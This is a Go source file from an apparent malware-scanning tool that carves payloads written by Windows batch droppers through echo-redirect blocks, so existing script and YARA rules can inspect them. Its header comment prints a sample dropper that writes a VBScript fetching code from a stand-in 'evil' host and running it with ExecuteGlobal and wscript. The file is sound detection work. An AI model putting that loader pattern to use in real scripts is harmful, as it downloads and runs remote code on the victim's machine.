package extract

import (
	"bytes"
	"time"
)

// Batch echo-redirect dropper carver.
//
// Windows .bat droppers hide their payloads by redirecting a sequence of
// "echo LINE" commands into a temporary file:
//
//	>"C:\Temp\payload.vbs" (
//	  echo Dim http
//	  echo Set http = CreateObject("MSXML2.ServerXMLHTTP")
//	  echo http.open "GET", "http://evil/x", False : http.send
//	  echo ExecuteGlobal http.responseText
//	)
//	wscript //nologo "C:\Temp\payload.vbs"
//
// or the single-line append form:
//
//	>>"C:\Temp\payload.vbs" echo Dim http
//	>>"C:\Temp\payload.vbs" echo Set http = CreateObject(...)
//
// In either shape the actual VBS/JS/PS1 payload never appears as a raw file on
// the mail path, so it bypasses scanners that only look at the outer .bat bytes.
// fromBatchDropper reconstructs each dropped file and routes it through
// extractChild so existing VBS/JS/PS1 keyword rules can match the plaintext.
//
// Self-gating (cheap prefilter before any allocation), fail-open, and bounded by
// the shared archive budget — modelled on unpackCab / fromHTMLSmuggling.

// maxBatchBlocks is the maximum number of echo-redirect blocks parsed per input.
// Mirrors maxArchiveMembers in spirit: caps how many dropped files one .bat may
// produce, guarding against hand-crafted inputs that list thousands of blocks.
const maxBatchBlocks = 256

// maxBatchAccum caps the cumulative bytes accumulated across ALL reconstructed
// files of one input before they are emitted. The per-file emit clamp
// (maxBytesPerMember) and the shared budget only apply at emit time, so without
// this a single multi-line block stuffed with millions of echo lines could grow
// the intermediate line slices unbounded before the clamp ever runs. Equal to
// the per-member cap: one full member's worth of carved text is plenty for a
// real dropper, and the raw outer scan still covers anything larger.
const maxBatchAccum = maxBytesPerMember

// fromBatchDropper carves echo-redirect dropped files from a .bat dropper
// buffer and emits each reconstructed payload through the shared budget so the
// existing script / decode / YARA pipeline reaches the plaintext content.
func fromBatchDropper(buf []byte, res *Result, b *archiveBudget, depth int, deadline time.Time) {
	if b == nil || len(buf) == 0 {
		return
	}
	if depth > maxNestDepth {
		if batchWouldCarve(buf) {
			res.stopHit("depth") // AUD-05: a batch dropper is left uncarved
		}
		return
	}
	if b.spent() || expired(deadline) {
		return
	}

	files, truncated := carveBatchFiles(buf)
	if truncated {
		res.stopHit("member-size") // set only by a refused or clamped carve line
	}

	for _, data := range files {
		if expired(deadline) {
			break // deadline has its own incompleteness path
		}
		if b.spent() || len(res.Streams) >= maxStreams {
			if len(data) >= minMemberBytes {
				archiveCapHit(res, b) // a carved file is left unemitted
			}
			break
		}
		emitMember(data, res, b, depth, deadline)
	}
}

// batchWouldCarve reports whether the carver would emit at least one payload
// from buf. It is pure (no recursion, no Result), so the cheap looksLikeBatch
// prefilter alone ("@echo off") never counts as unvisited content.
func batchWouldCarve(buf []byte) bool {
	// Ignore truncated flag: this function is a pure check for depth gating,
	// so it doesn't report incompleteness.
	files, _ := carveBatchFiles(buf)
	for _, data := range files {
		if len(data) >= minMemberBytes {
			return true
		}
	}
	return false
}

// carveBatchFiles parses echo-redirect blocks and returns each reconstructed
// file, clamped to maxBytesPerMember. Memory is bounded by maxBatchAccum and
// maxBatchBlocks. Returns (files, truncated) where truncated=true if either
// a per-file join was clamped at maxBytesPerMember or the accumulation cap
// stopped parsing early.
func carveBatchFiles(buf []byte) ([][]byte, bool) {
	if !looksLikeBatch(buf) {
		return nil, false
	}

	// ── Parse echo-redirect blocks ────────────────────────────────────────────
	// We walk line-by-line and recognise two shapes:
	//
	//   Shape 1 — multi-line block opener:
	//     >"<FILE>" (           (or >"<FILE>")
	//     echo LINE
	//     ...
	//     )
	//
	//   Shape 2 — single-line append:
	//     >>"<FILE>" echo LINE
	//
	// We accumulate lines per file name and emit each at the end.

	// dropped maps a normalised filename → accumulated lines (CRLF-separated).
	type dropped struct {
		name  string
		lines [][]byte
	}

	var files []dropped
	byName := make(map[string]int) // name → index in files

	getOrAdd := func(name string) int {
		if idx, ok := byName[name]; ok {
			return idx
		}
		idx := len(files)
		files = append(files, dropped{name: name})
		byName[name] = idx
		return idx
	}

	linesBuf := buf
	blocksEmitted := 0
	accum := 0         // cumulative reconstructed bytes accumulated so far (cap guard)
	truncated := false // set when join clamps or accumulation cap stops parsing

	// addLine appends a reconstructed (caret-unescaped) line to a file, accounting
	// it against the shared accumulation cap. Returns false once the cap is hit so
	// the caller stops parsing — a hostile mega-block can't grow memory unbounded.
	addLine := func(idx int, text []byte) bool {
		if accum+len(text) > maxBatchAccum {
			truncated = true
			return false
		}
		files[idx].lines = append(files[idx].lines, text)
		accum += len(text)
		return true
	}

	// inBlock is set when we are inside a multi-line  >"FILE" (  block.
	inBlock := false
	blockTarget := -1

	for len(linesBuf) > 0 && blocksEmitted < maxBatchBlocks {
		// Extract next line (LF or CRLF terminated).
		var line []byte
		if lf := bytes.IndexByte(linesBuf, '\n'); lf >= 0 {
			line = linesBuf[:lf]
			linesBuf = linesBuf[lf+1:]
		} else {
			line = linesBuf
			linesBuf = nil
		}
		// Strip trailing CR.
		line = bytes.TrimRight(line, "\r")
		// Strip leading whitespace (batch files allow indentation).
		trimmed := bytes.TrimLeft(line, " \t")

		if inBlock {
			// Closing paren on its own line ends the multi-line block.
			if bytes.Equal(trimmed, []byte(")")) {
				inBlock = false
				blockTarget = -1
				continue
			}
			// Lines inside the block: each should start with "echo " or "echo." (dot).
			text, ok := stripEchoPrefix(trimmed)
			if !ok {
				// Non-echo line inside block — treat as continuation (some droppers
				// mix in comments or bare text); skip it rather than aborting the block.
				continue
			}
			if blockTarget >= 0 {
				if !addLine(blockTarget, caretUnescape(text)) {
					break // accumulation cap hit — stop parsing, emit what we have
				}
			}
			continue
		}

		// Not in a block — look for a redirect line.
		// Shape 2: >>"<FILE>" echo LINE  (append redirect, single-line)
		if bytes.HasPrefix(trimmed, []byte(`>>`)) {
			rest := trimmed[2:]
			name, echoText, ok := parseRedirectLine(rest)
			if !ok || echoText == nil {
				continue
			}
			idx := getOrAdd(name)
			if !addLine(idx, caretUnescape(echoText)) {
				break
			}
			blocksEmitted++
			continue
		}

		// Shape 1: >"<FILE>" (  — multi-line block opener (single >)
		if bytes.HasPrefix(trimmed, []byte(`>`)) && !bytes.HasPrefix(trimmed, []byte(`>>`)) {
			rest := trimmed[1:]
			name, echoText, ok := parseRedirectLine(rest)
			if !ok {
				continue
			}
			if echoText != nil {
				// Single-line redirect with inline echo text.
				idx := getOrAdd(name)
				if !addLine(idx, caretUnescape(echoText)) {
					break
				}
				blocksEmitted++
			} else {
				// Opener of a multi-line block: >"FILE" (
				idx := getOrAdd(name)
				inBlock = true
				blockTarget = idx
				blocksEmitted++
			}
			continue
		}
	}

	var out [][]byte
	for i := range files {
		if len(files[i].lines) == 0 {
			continue
		}
		data := bytes.Join(files[i].lines, []byte("\r\n"))
		if len(data) > maxBytesPerMember {
			data = data[:maxBytesPerMember]
			truncated = true
		}
		out = append(out, data)
	}
	return out, truncated
}

// parseRedirectLine parses the part of a redirect line AFTER the leading > or >>
// (i.e. the file name + optional " echo TEXT" or " (").
//
// Returns (name, echoText, ok):
//   - ok=false   : not a redirect line we understand.
//   - echoText=nil : a multi-line block opener (ends with " (").
//   - echoText!=nil: a single-line redirect; echoText is the text after "echo ".
//
// Supported quoting: >"FILE" ..., >%TEMP%\file ..., >"C:\path\file" ...
func parseRedirectLine(rest []byte) (name string, echoText []byte, ok bool) {
	rest = bytes.TrimLeft(rest, " \t")
	if len(rest) == 0 {
		return "", nil, false
	}

	var nameBytes []byte
	if rest[0] == '"' {
		// Quoted filename.
		end := bytes.IndexByte(rest[1:], '"')
		if end < 0 {
			return "", nil, false
		}
		nameBytes = rest[1 : 1+end]
		rest = bytes.TrimLeft(rest[1+end+1:], " \t")
	} else {
		// Unquoted: take up to first space or end.
		sp := bytes.IndexAny(rest, " \t")
		if sp < 0 {
			nameBytes = rest
			rest = nil
		} else {
			nameBytes = rest[:sp]
			rest = bytes.TrimLeft(rest[sp:], " \t")
		}
	}

	if len(nameBytes) == 0 {
		return "", nil, false
	}
	name = string(nameBytes)

	if len(rest) == 0 {
		// Just a redirect to file with no payload — not a dropper pattern.
		return "", nil, false
	}

	// rest is now either "(", "echo TEXT", "echo.", etc.
	if bytes.Equal(rest, []byte("(")) {
		// Multi-line block opener.
		return name, nil, true
	}

	text, lineOk := stripEchoPrefix(rest)
	if !lineOk {
		return "", nil, false
	}
	return name, text, true
}

// stripEchoPrefix strips a leading echo command from a trimmed line and returns
// (text, true). cmd.exe ends the command word at a space, tab or one of
// .(:;,=/+[] and echoes everything after that one delimiter, so "echo.TEXT",
// "echo(TEXT", "echo:TEXT" and "echo<TAB>TEXT" all print TEXT and a bare
// "echo." prints an empty line (COR-10). Returns ("", false) if the line does
// not start with echo.
func stripEchoPrefix(line []byte) ([]byte, bool) {
	if len(line) < 4 || !bytes.EqualFold(line[:4], []byte("echo")) {
		return nil, false
	}
	if len(line) == 4 {
		return []byte{}, true // bare "echo" at end of line -> empty
	}
	switch line[4] {
	case ' ', '\t', '.', '(', ':', ';', ',', '=', '/', '+', '[', ']':
		return line[5:], true
	}
	return nil, false // "echoX...": a different command word
}

// caretUnescape removes batch caret escapes: "^X" → "X" (including "^^" → "^").
// A trailing "^" (line-continuation) is simply dropped.
func caretUnescape(src []byte) []byte {
	if bytes.IndexByte(src, '^') < 0 {
		return src // fast path: no carets
	}
	out := make([]byte, 0, len(src))
	for i := 0; i < len(src); i++ {
		if src[i] == '^' && i+1 < len(src) {
			out = append(out, src[i+1])
			i++
		} else if src[i] == '^' {
			// trailing ^ (line-continuation) — drop it
		} else {
			out = append(out, src[i])
		}
	}
	return out
}

// looksLikeBatch is the alloc-free prefilter shared by the carve and the depth
// stop.
func looksLikeBatch(buf []byte) bool {
	// ── Cheap prefilter (alloc-free) ──────────────────────────────────────────
	// Only proceed if the buffer looks batch-ish. We require EITHER:
	//   (a) "@echo off" (case-insensitive), OR
	//   (b) at least two redirect-echo patterns (>>" followed by " echo, or >")
	// This keeps the cost near-zero on arbitrary non-batch text buffers.
	echoOff := []byte("@echo off")
	redirectQ := []byte(`>"`)
	appendQ := []byte(`>>"`)

	hasBatch := asciiContainsFold(buf, echoOff)
	if !hasBatch {
		// Count redirect-echo occurrences; bail if fewer than 2.
		n := 0
		rest := buf
		for len(rest) > 0 {
			i := bytes.Index(rest, appendQ)
			j := bytes.Index(rest, redirectQ)
			// Pick whichever comes first.
			pick := -1
			if i >= 0 && (j < 0 || i <= j) {
				pick = i
			} else if j >= 0 {
				pick = j
			}
			if pick < 0 {
				break
			}
			n++
			if n >= 2 {
				hasBatch = true
				break
			}
			// Advance past the full matched token: 3 bytes for `>>"`, else 2 for `>"`.
			adv := 2
			if bytes.HasPrefix(rest[pick:], appendQ) {
				adv = 3
			}
			rest = rest[pick+adv:]
		}
	}
	return hasBatch
}
